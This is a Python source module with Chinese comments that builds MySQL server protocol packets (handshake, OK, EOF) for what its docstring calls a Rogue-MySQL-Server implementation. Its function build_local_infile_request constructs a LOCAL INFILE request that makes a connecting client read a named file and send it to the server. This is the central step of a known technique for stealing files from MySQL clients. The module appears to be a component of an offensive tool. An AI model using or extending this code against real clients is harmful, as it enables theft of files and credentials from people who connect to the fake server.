"""MySQL 握手与常用响应报文的构造函数。

报文内容参照原始 Rogue-MySQL-Server 的握手实现，保证对常见 MySQL
客户端（mysql CLI / libmysql / JDBC / pymysql）的兼容性。
"""

from __future__ import annotations

import struct

from protocol.packet import MySQLPacket

# 客户端命令（payload 首字节）
COM_QUIT = 0x01
COM_INIT_DB = 0x02
COM_QUERY = 0x03
COM_FIELD_LIST = 0x04
COM_PING = 0x0E

LOCAL_INFILE = 0xFB

SERVER_VERSION = b"5.6.28-0ubuntu0.14.04.1"
AUTH_PLUGIN_NAME = b"mysql_native_password\x00"
AUTH_DATA_PART1 = bytes.fromhex("403f59264b2b3460")
AUTH_DATA_PART2 = bytes.fromhex("68695f525f63556064535200")

# CLIENT_LONG_PASSWORD | CLIENT_FOUND_ROWS | CLIENT_LONG_FLAG |
# CLIENT_CONNECT_WITH_DB | CLIENT_PROTOCOL_41 | CLIENT_TRANSACTIONS |
# CLIENT_SECURE_CONNECTION | CLIENT_LOCAL_FILES | CLIENT_PLUGIN_AUTH ...
CAPABILITY_LOWER = b"\xff\xf7"
CAPABILITY_UPPER = b"\x7f\x80"


def build_handshake(connection_id: int = 45, packet_num: int = 0) -> MySQLPacket:
    """构造服务端握手报文（Protocol::HandshakeV10）。"""
    payload = b"".join((
        b"\x0a",                                # protocol version 10
        SERVER_VERSION + b"\x00",               # server version
        struct.pack("<I", connection_id),       # connection id
        AUTH_DATA_PART1,                        # auth-plugin-data-part-1
        b"\x00",                                # filler
        CAPABILITY_LOWER,                       # capability flags (lower)
        b"\x08",                                # character set
        b"\x02\x00",                            # status flags
        CAPABILITY_UPPER,                       # capability flags (upper)
        bytes([len(AUTH_DATA_PART1) + len(AUTH_DATA_PART2)]),
        b"\x00" * 10,                           # reserved
        AUTH_DATA_PART2,                        # auth-plugin-data-part-2
        AUTH_PLUGIN_NAME,                       # auth plugin name
    ))
    return MySQLPacket(packet_num, payload)


def build_ok(packet_num: int) -> MySQLPacket:
    """构造 OK 报文：0 行受影响，无警告。"""
    return MySQLPacket(packet_num, b"\x00\x00\x00\x02\x00\x00\x00")


def build_eof(packet_num: int) -> MySQLPacket:
    """构造 EOF 报文（用于 COM_INIT_DB 等）。"""
    return MySQLPacket(packet_num, b"\xfe\x00\x00\x02\x00")


def build_local_infile_request(packet_num: int, filename: str | bytes) -> MySQLPacket:
    """构造 LOCAL INFILE 请求，要求客户端读取并发送指定文件。"""
    if isinstance(filename, str):
        filename = filename.encode("utf-8", "surrogateescape")
    return MySQLPacket(packet_num, bytes([LOCAL_INFILE]) + filename)
